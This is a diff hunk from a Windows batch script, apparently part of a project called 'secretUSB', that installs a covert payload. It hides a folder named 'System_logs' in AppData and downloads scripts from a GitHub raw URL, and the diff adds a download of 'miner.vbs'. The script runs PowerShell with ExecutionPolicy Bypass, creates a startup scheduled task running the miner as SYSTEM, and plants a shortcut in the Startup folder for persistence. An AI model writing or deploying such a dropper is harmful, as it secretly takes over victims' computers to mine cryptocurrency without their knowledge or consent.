@@ -92,12 +92,13 @@ cd %USERPROFILE%\AppData\Roaming\System_logs
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/miner.vbs
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
 
 start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
-schtasks /create /tn "tkt" /tr "C:\miner.vbs" /sc onstart /ru System
+schtasks /create /tn "tkt" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
